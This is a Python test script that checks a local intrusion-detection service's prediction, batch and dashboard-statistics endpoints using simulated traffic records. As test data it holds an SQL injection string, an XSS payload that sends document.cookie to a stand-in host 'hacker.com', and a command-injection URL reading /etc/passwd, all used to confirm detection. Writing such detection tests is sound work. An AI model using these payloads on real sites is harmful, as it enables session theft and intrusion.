import asyncio
import httpx
import json
import random
import time

BASE_URL = "http://localhost:8000"

# Standard benign traffic template (mimics a normal HTTP request)
BENIGN_TEMPLATE = {
    "flow_duration": 45000.0,
    "flow_iat_mean": 2000.0,
    "flow_iat_std": 500.0,
    "packet_count": 12.0,
    "fwd_packets": 6.0,
    "bwd_packets": 6.0,
    "fwd_bwd_ratio": 1.0,
    "byte_count": 5000.0,
    "fwd_bytes": 1000.0,
    "bwd_bytes": 4000.0,
    "flow_bytes_per_sec": 111.1,
    "flow_packets_per_sec": 0.26,
    "avg_packet_size": 416.0,
    "fwd_packet_size_mean": 166.0,
    "bwd_packet_size_mean": 666.0,
    "syn_flag_count": 0.0,
    "ack_flag_count": 1.0,
    "rst_flag_count": 0.0,
    "fin_flag_count": 0.0,
    "psh_flag_count": 1.0,
    "payload_length": 1500.0,
    "payload_entropy": 4.5,
    "fwd_header_length": 192.0,
    "bwd_header_length": 192.0,
    "url": "/index.html",
    "body": "",
    "header": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

class TestTracker:
    def __init__(self):
        self.total_sent = 0
        self.expected_attacks = {}
        
    def add(self, attack_type=None, count=1):
        self.total_sent += count
        if attack_type:
            self.expected_attacks[attack_type] = self.expected_attacks.get(attack_type, 0) + count

def log_step(msg):
    print(f"\n\033[1;34m[=>]\033[0m \033[1m{msg}\033[0m")

def log_success(msg):
    print(f"\033[1;32m[✓]\033[0m {msg}")

def log_error(msg):
    print(f"\033[1;31m[x]\033[0m {msg}")

async def run_simulation():
    tracker = TestTracker()
    
    async with httpx.AsyncClient(timeout=30.0) as client:
        log_step("Phase 1: Pre-flight & Reset")
        
        # 1. Health Check
        try:
            res = await client.get(f"{BASE_URL}/health")
            res.raise_for_status()
            data = res.json()
            if data.get("status") != "ok":
                log_error(f"System not ready: {data}")
                return
            log_success(f"System Health OK. Models Loaded: {data.get('models_loaded')}")
        except Exception as e:
            log_error(f"Health check failed: {e}")
            return

        # 2. Reset Dashboard
        res = await client.delete(f"{BASE_URL}/stats/reset")
        if res.status_code == 200:
            log_success("Dashboard and Prediction Logs successfully reset to zero.")
        else:
            log_error(f"Failed to reset stats: {res.text}")

        time.sleep(1)

        log_step("Phase 2: Feature & Threat Simulation (Single Predict)")

        # 2a. Normal Traffic
        payload = dict(BENIGN_TEMPLATE)
        res = await client.post(f"{BASE_URL}/predict", json=payload)
        data = res.json()
        
        predicted = data["predicted_attack"]
        tracker.add(predicted)
        log_success(f"Baseline traffic processed correctly. ML classified as: {predicted} (Confidence: {data['confidence']:.2f})")

        # 2b. Signature Threat: SQL Injection
        payload = dict(BENIGN_TEMPLATE)
        payload["url"] = "/login?user=admin' OR 1=1 --"
        res = await client.post(f"{BASE_URL}/predict", json=payload)
        data = res.json()
        assert data["signature_matched"] == True, "Signature engine failed to catch SQLi"
        tracker.add(data["predicted_attack"])
        log_success(f"SQL Injection caught by signature engine! Rule: {data['signature_rule']}")

        # 2c. Signature Threat: XSS
        payload = dict(BENIGN_TEMPLATE)
        payload["body"] = "<script>fetch('http://hacker.com?cookie='+document.cookie)</script>"
        res = await client.post(f"{BASE_URL}/predict", json=payload)
        data = res.json()
        assert data["signature_matched"] == True, "Signature engine failed to catch XSS"
        tracker.add(data["predicted_attack"])
        log_success(f"XSS Payload caught by signature engine! Rule: {data['signature_rule']}")

        # 2d. ML Classifier: DDoS Simulation (massive packet flow)
        payload = dict(BENIGN_TEMPLATE)
        payload["flow_packets_per_sec"] = 50000.0
        payload["fwd_packets"] = 25000.0
        payload["byte_count"] = 99999999.0
        res = await client.post(f"{BASE_URL}/predict", json=payload)
        data = res.json()
        # It should classify as DDOS or DOS
        tracker.add(data["predicted_attack"])
        log_success(f"ML Classifier detected volumetric attack as: {data['predicted_attack']}")

        # 2e. ML Classifier: PortScan Simulation (high SYN, 0 BWD)
        payload = dict(BENIGN_TEMPLATE)
        payload["syn_flag_count"] = 1.0
        payload["ack_flag_count"] = 0.0
        payload["bwd_packets"] = 0.0
        payload["fwd_packets"] = 1.0
        payload["avg_packet_size"] = 0.0
        res = await client.post(f"{BASE_URL}/predict", json=payload)
        data = res.json()
        tracker.add(data["predicted_attack"])
        log_success(f"ML Classifier detected stealth scan as: {data['predicted_attack']}")

        # 2f. Zero-Day Anomaly Detection (out of distribution numeric values)
        payload = dict(BENIGN_TEMPLATE)
        payload["flow_duration"] = 0.00001
        payload["payload_entropy"] = 99999.0 # Impossible entropy
        payload["fwd_packet_size_mean"] = 88888888.0 
        res = await client.post(f"{BASE_URL}/predict", json=payload)
        data = res.json()
        tracker.add(data["predicted_attack"])
        log_success(f"Autoencoder processed anomalous payload. Score: {data['anomaly_score']:.2f} (Is Anomaly: {data['is_anomaly']})")


        log_step("Phase 3: Load Testing & Batch Processing")
        
        batch_records = []
        for i in range(500):
            record = dict(BENIGN_TEMPLATE)
            # Add some randomness to flow
            record["flow_duration"] += random.randint(-1000, 1000)
            
            # Make ~10% of the batch simulated attacks
            if i % 10 == 0:
                record["flow_packets_per_sec"] = 20000.0 # Volumetric
            elif i % 15 == 0:
                record["url"] = "/exec?cmd=cat /etc/passwd" # Command Injection
                
            batch_records.append(record)

        log_success("Generated batch of 500 mixed records...")
        res = await client.post(f"{BASE_URL}/predict/batch", json={"records": batch_records})
        batch_data = res.json()
        assert batch_data["total"] == 500, "Batch didn't return exactly 500 results"
        
        for r in batch_data["results"]:
            tracker.add(r["predicted_attack"])
            
        log_success("Batch API processed 500 records successfully!")


        log_step("Phase 4: Dashboard Statistics Validation")
        time.sleep(1) # Wait for any async DB commits (though they are sync in this app)
        
        res = await client.get(f"{BASE_URL}/stats")
        stats = res.json()
        
        db_total = stats["total_requests"]
        db_dist = stats["attack_distribution"]
        
        log_success(f"Dashboard reports {db_total} total requests. Expected: {tracker.total_sent}")
        assert db_total == tracker.total_sent, f"Total counts mismatch! DB: {db_total}, Expected: {tracker.total_sent}"
        
        for attack, count in tracker.expected_attacks.items():
            db_count = db_dist.get(attack, 0)
            log_success(f"Validation: {attack} -> DB: {db_count} | Expected: {count}")
            assert db_count == count, f"Mismatch in {attack}! DB: {db_count}, Expected: {count}"

        log_step("Simulation Completed Successfully!")
        print("\033[1;32mEverything is working perfectly. Check out your dashboard in the browser!\033[0m\n")

if __name__ == "__main__":
    asyncio.run(run_simulation())
